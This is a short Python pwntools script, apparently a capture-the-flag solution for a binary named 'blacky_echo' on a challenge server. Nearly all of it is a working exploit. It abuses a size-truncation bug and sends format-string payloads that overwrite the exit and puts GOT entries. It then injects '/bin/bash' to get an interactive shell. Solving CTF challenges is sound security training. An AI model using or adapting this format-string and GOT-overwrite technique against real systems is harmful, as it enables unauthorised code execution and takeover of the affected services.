#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF('./blacky_echo')

if args.REMOTE:
    r = remote('blacky-echo.challs.olicyber.it', 11002)
else:
    r = gdb.debug('./blacky_echo', '''
        b *print_error+125
        continue
    ''')


PAYLOAD = b"%2876x%12$hnAAAA" + p64(elf.got['exit']) 
print(hex(elf.got['exit']), PAYLOAD)
r.recvuntil(b'Size: ')
r.sendline(b'131134') # 131134 & (1 << 17 - 1) == 62
r.recvuntil(b'Input: ')
r.sendline(b'a' * (65530 + 6) + b'c' * 3 + b'b' * 10 + PAYLOAD) # gotta go fast now lol, alert(1)

PAYLOAD = b"%40x%12$hhnAAAAA" + p64(elf.got['puts']) 
r.recvuntil(b'Size: ')
r.sendline(b'131134') # 131134 & (1 << 17 - 1) == 62
r.recvuntil(b'Input: ')
r.sendline(b'a' * (65530 + 6) + b'c' * 3 + b'b' * 10 + PAYLOAD) # gotta go fast now lol, alert(1)

r.recvuntil(b'Size: ')
r.sendline(b'40')
r.recvuntil(b'Input: ')
r.sendline(b'ECHO->/bin/bash')
r.interactive()